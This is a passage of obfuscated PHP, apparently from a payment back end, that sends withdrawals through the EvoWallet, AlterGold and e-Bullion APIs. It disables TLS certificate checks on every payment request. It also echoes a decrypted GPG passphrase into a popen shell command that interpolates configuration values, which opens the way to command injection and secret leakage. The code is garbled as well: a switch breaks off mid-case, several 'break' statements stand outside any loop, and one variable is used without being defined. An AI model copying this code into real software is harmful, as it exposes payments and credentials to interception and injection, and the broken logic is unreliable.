        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcMCLM = elnlcwhxl( $a );
        if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcqjpcv'] )
        {
            return array( 1, "", $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] );
        }
        else
        {
            if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcrGtTo'] )
            {
                $e = elnlccplb( "{$elnlcszUr} ".$elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcuezqb( $elnlcbJReV )
{
    global $elnlcNjKgR;
    $elnlcMCLM = array( );
    $elnlckWKI = elnlcmjoon( $elnlcbJReV, "response" );
    if ( $elnlckWKI != "" )
    {
        $elnlcsyrp = $elnlckWKI;
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = elnlcmjoon( $elnlcsyrp, "status" );
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcmjoon( $elnlczDVJ, "statusmsg" );
        $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] = elnlcmjoon( $elnlcsyrp, "batch" );
        $elnlcMCLM[$elnlcNjKgR['elnlcyOIhr']] = elnlcmjoon( $elnlcsyrp, "fromaccount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcJhrO']] = elnlcmjoon( $elnlcsyrp, "toaccount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcmjoon( $elnlcsyrp, "amount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcComr']] = elnlcmjoon( $elnlcsyrp, "currency" );
        $elnlcMCLM[$elnlcNjKgR['elnlcThWrk']] = elnlcmjoon( $elnlcsyrp, "checksum" );
        if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == 0 )
        {
            $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuoBpT'];
        }
    }
    if ( 0 < $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] )
    {
        switch ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] )
        {
            case 10310 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10310: Invalid Account Prefix";
                break;
            case 10311 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10311: Payer account has been suspended";
                break;
            case 10312 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10312: API transfer disabled";
                break;
            case 10313 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10313: Payee account not found";
                break;
            case 10314 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10314: Payer spending over daily limit";
                break;
            case 10315 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10315: Payee account has been suspended";
                break;
            case 10316 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10316: Payee account has been limited";
                break;
            case 10317 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10317: Spending less than minimum allowed";
                break;
            case 10318 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10318: Payee will reach their balance limit";
                break;
            case 10319 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10319: Payer do not have enough funds";
                break;
            case 10320 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10320: Payee has an invalid balance security check";
                break;
            case 10321 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10321: Spend was not complete";
                break;
            case 10322 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10322: Payee account group not found";
                break;
            case 10323 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10323: Invalid payee account";
                break;
            case 10324 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10324: Invalid IP range";
                break;
            case 10325 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10325: Invalid API or not enabled";
                break;
            case 10326 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10326: Payer account group not found";
                break;
            case 10327 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10327: Invalid payer account";
                break;
            case 10328 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10328: Invalid checksum";
                break;
            case 10110 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10110: Invalid Account Prefix";
                break;
            case 10111 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10111: Account has been suspended";
                break;
            case 10112 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10112: Invalid API or API not enabled";
                break;
            case 10113 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10113: API balance query disabled";
                break;
            case 10114 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10114: IP not in the allowed range";
                break;
            case 10115 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10115: Balance can not be retrieved";
                break;
            case 10116 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10116: Reserve";
                break;
            case 10117 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10117: Account group not found";
                break;
            case 10118 :
                $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10118: This account can not be found";
                break;
            case 10119 :
        }
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = "10119: Invalid Checksum";
        break;
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlccIvuM'];
    }
    return $elnlcMCLM;
}

function elnlcfhso( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr, $elnlcKOSa = "USD" )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty EvoWallet account.'";
        mysql_query( $q );
        return array( 0, "Invalid EvoWallet account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 24 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 24 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='evowallet_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcnaCDe = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
            $elnlcxCEca = $elnlccQgz[$elnlcNjKgR['elnlcDRmQ']];
        }
        else
        {
            $elnlcxCEca = preg_split( "/\\|/", $elnlcUfUR )[1];
            $elnlcnaCDe = preg_split( "/\\|/", $elnlcUfUR )[0];
        }
        $elnlcFCfmJ = curl_init( );
        $elnlcbSQT = date( $elnlcNjKgR['elnlcSBWls'] );
        $elnlcsaRi = strtoupper( md5( $elnlcxCEca.$elnlcbSQT."103"."".$elnlcKOSa.$elnlccQgz[$elnlcNjKgR['elnlcncGQ']].$elnlcwELo.$elnlcUnxH.md5( $elnlcnaCDe ) ) );
        $elnlclpQg = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<request>\r\n<apiname>".htmlentities( $elnlcxCEca, ENT_NOQUOTES )."</apiname>\r\n<trandate>".$elnlcbSQT."</trandate>\r\n<trantype>103</trantype>\r\n<tranid></tranid>\r\n<curcode>".$elnlcKOSa."</curcode>\r\n<fromaccount>".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcncGQ']], ENT_NOQUOTES )."</fromaccount>\r\n<toaccount>".htmlentities( $elnlcwELo, ENT_NOQUOTES )."</toaccount>\r\n<amount>".htmlentities( $elnlcUnxH, ENT_NOQUOTES )."</amount>\r\n<memo>".htmlentities( $elnlclHqeS, ENT_NOQUOTES )."</memo> \r\n<checksum>".$elnlcsaRi."</checksum> \r\n</request>";
        $elnlcFCfmJ = curl_init( );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://www.evowallet.com/api.php?req=".urlencode( $elnlclpQg ) );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcMCLM = elnlcuezqb( $a );
        if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcqjpcv'] )
        {
            return array( 1, "", $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] );
        }
        else
        {
            if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcrGtTo'] )
            {
                $e = elnlccplb( "{$elnlcszUr} ".$elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']]."<br>".$elnlcMCLM[$elnlcNjKgR['elnlcxcOPc']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlclwqr( $elnlcgQEH, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to AlterGold account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid AlterGold account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 17 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 17 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcgQEH == "" )
        {
            $q = "select v from hm2_pay_settings where n='altergold_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcRqHL = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcRqHL = $elnlcgQEH;
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://api.altergold.com/spend.php" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "PAYER_ACCOUNT=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcrGtC']] )."&PAYER_PASSWORD=".rawurlencode( $elnlcRqHL )."&PAYEE_ACCOUNT=".rawurlencode( $elnlcwELo )."&PAYMENT_AMOUNT=".rawurlencode( $elnlcUnxH )."&PAYMENT_CURRENCY=USD&MEMO={$elnlclHqeS}" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        if ( $a == "" )
        {
            print "Blank response from Altergold processor service.";
        }
        else
        {
            $elnlcygaT = array( "E10011" => "Unable to Login as Payer. This means wrong login information was provided.", "E10012" => "Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.", "E10013" => "API Automated Spends not Enabled.", "E10014" => "Unable to authorize IP address.", "E10015" => "Recipient account not found", "E10016" => "Recipient account is suspended.", "E10017" => "Invalid spend units.", "E10018" => "Spend amount is too low.", "E10019" => "Recipient reached balance limit.", "E10020" => "Not enough funds.", "E10021" => "* Please contact support." );
            if ( $elnlcygaT[$a] != "" )
            {
                $e = elnlccplb( "{$elnlcszUr} {$elnlcygaT[$a]}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." {$elnlcygaT[$a]}", "" );
            }
            else
            {
                return array( 1, "", $a );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlczjyug( $elnlcAazl, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr, $elnlcBJQb )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to e-Bullion account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid e-Bullion account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 5 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 5 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        $elnlcAMdI = "<atip.batch.v1><payment.list>";
        $elnlcAMdI = $elnlcAMdI."<payment>";
        $elnlcAMdI = $elnlcAMdI."<payer>".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcuNsVm']], ENT_NOQUOTES )."</payer>";
        $elnlcAMdI = $elnlcAMdI."<payee>".htmlentities( $elnlcwELo, ENT_NOQUOTES )."</payee>";
        $elnlcAMdI = $elnlcAMdI."<amount>".htmlentities( $elnlcUnxH, ENT_NOQUOTES )."</amount>";
        $elnlcAMdI = $elnlcAMdI."<metal>".( $elnlcBJQb == 5 ? 1 : 3 )."</metal>";
        $elnlcAMdI = $elnlcAMdI."<unit>1</unit>";
        $elnlcAMdI = $elnlcAMdI."<memo>".htmlentities( $elnlclHqeS, ENT_NOQUOTES )."</memo>";
        $elnlcAMdI = $elnlcAMdI."<ref></ref>";
        $elnlcAMdI = $elnlcAMdI."</payment>";
        $elnlcAMdI = $elnlcAMdI."</payment.list></atip.batch.v1>";
        $elnlcRTyG = tempnam( "./tmpl_c/", "in." );
        $elnlczlrfa = tempnam( "./tmpl_c/", "out." );
        $elnlcriRu = fopen( $elnlcRTyG, $elnlcNjKgR['elnlcItAWm'] );
        fwrite( $elnlcriRu, $elnlcAMdI );
        fclose( $elnlcriRu );
        $elnlcGPhx = "./tmpl_c/";
        $elnlcNjfbo = escapeshellcmd( $elnlccQgz[$elnlcNjKgR['elnlcfgdt']] );
        $elnlcHWFE = elnlcbtvch( $elnlccQgz[$elnlcNjKgR['elnlcLtwy']], $elnlcNjKgR['elnlcfynR'] );
        $elnlcliIo = $elnlccQgz[$elnlcNjKgR['elnlcJMvc']];
        $elnlcokal = " --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir {$elnlcGPhx} --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0";
        $elnlcoDOu = "echo '{$elnlcHWFE}' | {$elnlcNjfbo} {$elnlcokal} --recipient A20077\\@e-bullion.com --local-user ".$elnlccQgz[$elnlcNjKgR['elnlcuNsVm']]."\\@e-bullion.com --output {$elnlczlrfa} --sign --encrypt {$elnlcRTyG} 2>&1";
        $elnlcDHagB = "";
        $elnlcbEvg = popen( "{$elnlcoDOu}", "r" );
        while ( !feof( $elnlcbEvg ) )
        {
            $elnlcDHagB = fgets( $elnlcbEvg, 4096 );
        }
        pclose( $elnlcbEvg );
        $elnlcriRu = fopen( $elnlczlrfa, $elnlcNjKgR['elnlcVPbvy'] );
        $elnlctcrFw = fread( $elnlcriRu, filesize( $elnlczlrfa ) );
        fclose( $elnlcriRu );
        unlink( $elnlcRTyG );
        unlink( $elnlczlrfa );
        $elnlcetpj = "ATIP_ACCOUNT=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcuNsVm']] )."&ATIP_BATCH_MSG=".rawurlencode( $elnlctcrFw )."&ATIP_STATUS_URL=".rawurlencode( $elnlcliIo );
        $elnlcFCfmJ = curl_init( );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://atip.e-bullion.com/batch.php?{$elnlcetpj}" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_HEADER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlckoJVn = array( );
        $elnlchFzn = "";
        if ( preg_match( "/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/", $a, $elnlckoJVn ) )
        {
            $elnlchFzn = $elnlckoJVn[1];
        }
        $elnlchFzn = urldecode( $elnlchFzn );
        $elnlcPtgvJ = tempnam( "./tmpl_c/", "xml.cert." );
        $elnlcqmmVb = tempnam( "./tmpl_c/", "xml.tmp." );
        $elnlcriRu = fopen( "{$elnlcqmmVb}", $elnlcNjKgR['elnlcItAWm'] );
        fwrite( $elnlcriRu, $elnlchFzn );
        fclose( $elnlcriRu );
        $elnlcokal = " --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir {$elnlcGPhx} --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0";
        $elnlcoDOu = "echo '{$elnlcHWFE}' | {$elnlcNjfbo} {$elnlcokal} --output {$elnlcPtgvJ} --decrypt {$elnlcqmmVb} 2>&1";
        $elnlcDHagB = "";
        $elnlcVuBD = "";
        $elnlcbEvg = popen( "{$elnlcoDOu}", "r" );
        while ( !feof( $elnlcbEvg ) )
        {
            $elnlcDHagB = fgets( $elnlcbEvg, 4096 );
            $elnlcevlCc = strstr( $elnlcDHagB, "key ID" );
            if ( 0 < strlen( $elnlcevlCc ) )
            {
                $elnlcVuBD = preg_replace( "/[\\n\\r]/", "", substr( $elnlcevlCc, 7 ) );
            }
        }
        pclose( $elnlcbEvg );
        if ( $elnlcVuBD == $elnlccQgz[$elnlcNjKgR['elnlcQmcc']] )
        {
            if ( is_file( "{$elnlcPtgvJ}" ) )
            {
                $elnlcONbdA = fopen( "{$elnlcPtgvJ}", $elnlcNjKgR['elnlcVPbvy'] );
                $elnlcbJReV = fread( $elnlcONbdA, filesize( "{$elnlcPtgvJ}" ) );
                fclose( $elnlcONbdA );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Can not found decrypted verification response!" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." Can not found decrypted verification response!", "" );
            }
            $elnlclpQg = elnlckscq( $elnlcbJReV );
            if ( $elnlclpQg[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcqjpcv'] )
            {
                return array( 1, "", $elnlclpQg[$elnlcNjKgR['elnlcgIiR']] );
            }
            else
            {
                if ( $elnlclpQg[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcrGtTo'] )
                {
                    $e = elnlccplb( "{$elnlcszUr} ".$elnlclpQg[$elnlcNjKgR['elnlcAMcNx']]." ".$elnlclpQg[$elnlcNjKgR['elnlcxcOPc']] );
                    $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                    mysql_query( $q );
                    return array( 0, $elnlcszUr.$elnlclpQg[$elnlcNjKgR['elnlcAMcNx']]." ".$elnlclpQg[$elnlcNjKgR['elnlcxcOPc']] );
                }
                else
                {
                    $e = elnlccplb( "{$elnlcszUr} Unknown error" );
                    $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                    mysql_query( $q );
                    return array( 0, $elnlcszUr." Unknown error", "" );
                }
            }
        }
        else
        {
            $e = elnlccplb( "{$elnlcszUr} Can not decrypt verification response! " );
            $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
            mysql_query( $q );
            return array( 0, $elnlcszUr." Can not decrypt verification response!", "" );
        }
        unlink( $elnlcqmmVb );
        unlink( $elnlcPtgvJ );
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available", "" );
    }
}

function elnlcmjoon( $elnlclpQg, $elnlcISnyG )
{
    global $elnlcNjKgR;
    $elnlcISnyG = strtolower( $elnlcISnyG );
    $elnlcGLTEK = strlen( $elnlcISnyG ) + 2;
    if ( ( $elnlcDcRri = strpos( $elnlclpQg, "<{$elnlcISnyG}>" ) ) === false )
    {
        return "";
    }
    if ( ( $elnlccpQG = strpos( $elnlclpQg, "</{$elnlcISnyG}>" ) ) === false )
    {
        return "";
    }
    $elnlczJpzw = trim( substr( $elnlclpQg, $elnlcDcRri + $elnlcGLTEK, $elnlccpQG - ( $elnlcDcRri + $elnlcGLTEK ) ) );
    return $elnlczJpzw;
}

function elnlckscq( $elnlcbJReV )
{
    global $elnlcNjKgR;
    $elnlcMCLM = array( );
    $elnlcJOoL = elnlcmjoon( $elnlcbJReV, "balanceresponse.list" );
    if ( $elnlcJOoL != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlctfNL'];
        $elnlczBVBF = false;
        if ( ( $elnlcvIbrg = stristr( $elnlcJOoL, "<balance>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlcJOoL ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlcJOoL, "</balance>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlcJOoL ) - strlen( $elnlcbKqIA );
        }
        if ( $elnlczBVBF )
        {
            break;
        }
        else
        {
            $elnlcGrcI = trim( substr( $elnlcJOoL, $elnlcDcRri + 9, $elnlccpQG - 9 ) );
            $elnlcJOoL = trim( substr( $elnlcJOoL, $elnlccpQG + 10 ) );
            $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcmjoon( $elnlcGrcI, "amount" );
        }
        if ( ( $elnlcvIbrg = stristr( $elnlcJOoL, "<balance>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlcJOoL ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlcJOoL, "</balance>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlcJOoL ) - strlen( $elnlcbKqIA );
        }
    }
    $elnlckWKI = elnlcmjoon( $elnlcbJReV, "verified.list" );
    if ( $elnlckWKI != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuoBpT'];
        $elnlczBVBF = false;
        if ( ( $elnlcvIbrg = stristr( $elnlckWKI, "<transaction>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlckWKI ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlckWKI, "</transaction>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlckWKI ) - strlen( $elnlcbKqIA );
        }
        if ( $elnlczBVBF )
        {
            break;
        }
        else
        {
            $elnlcsyrp = trim( substr( $elnlckWKI, $elnlcDcRri + 13, $elnlccpQG - 13 ) );
            $elnlckWKI = trim( substr( $elnlckWKI, $elnlccpQG + 14 ) );
            $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] = elnlcmjoon( $elnlcsyrp, "id" );
            $elnlcMCLM[$elnlcNjKgR['elnlcJhrO']] = elnlcmjoon( $elnlcsyrp, "payee" );
            $elnlcMCLM[$elnlcNjKgR['elnlcyOIhr']] = elnlcmjoon( $elnlcsyrp, "payer" );
            $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcmjoon( $elnlcsyrp, "amount" );
            $elnlcMCLM[$elnlcNjKgR['elnlcFVLf']] = elnlcmjoon( $elnlcsyrp, "metal" );
            $elnlcMCLM[$elnlcNjKgR['elnlcUTaV']] = elnlcmjoon( $elnlcsyrp, "unit" );
            $elnlcMCLM[$elnlcNjKgR['elnlcNwEa']] = elnlcmjoon( $elnlcsyrp, "memo" );
            $elnlcMCLM[$elnlcNjKgR['elnlcqdow']] = elnlcmjoon( $elnlcsyrp, "exchange" );
            $elnlcMCLM[$elnlcNjKgR['elnlcJGMq']] = elnlcmjoon( $elnlcsyrp, "fee" );
        }
        if ( ( $elnlcvIbrg = stristr( $elnlckWKI, "<transaction>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlckWKI ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlckWKI, "</transaction>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlckWKI ) - strlen( $elnlcbKqIA );
        }
    }
    $elnlcxHdR = elnlcmjoon( $elnlcbJReV, "failed.list" );
    if ( $elnlcxHdR != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlccIvuM'];
        $elnlczBVBF = false;
        if ( ( $elnlcvIbrg = stristr( $elnlcxHdR, "<failed>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlcxHdR ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlcxHdR, "</failed>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlcxHdR ) - strlen( $elnlcbKqIA );
        }
        if ( $elnlczBVBF )
        {
            break;
        }
        else
        {
            $elnlcnMwy = trim( substr( $elnlcxHdR, $elnlcDcRri + 13, $elnlccpQG - 13 ) );
            $elnlcxHdR = trim( substr( $elnlcxHdR, $elnlccpQG + 14 ) );
            $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcmjoon( $elnlcnMwy, "error" );
        }
        if ( ( $elnlcvIbrg = stristr( $elnlcxHdR, "<failed>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlcxHdR ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlcxHdR, "</failed>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlcxHdR ) - strlen( $elnlcbKqIA );
        }
    }
    $elnlcyzIrk = elnlcmjoon( $elnlcbJReV, "errorresponse.list" );
    if ( $elnlcyzIrk != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlccIvuM'];
        $elnlczBVBF = false;
        if ( ( $elnlcvIbrg = stristr( $elnlcyzIrk, "<errorresponse>" ) ) === false )
        {
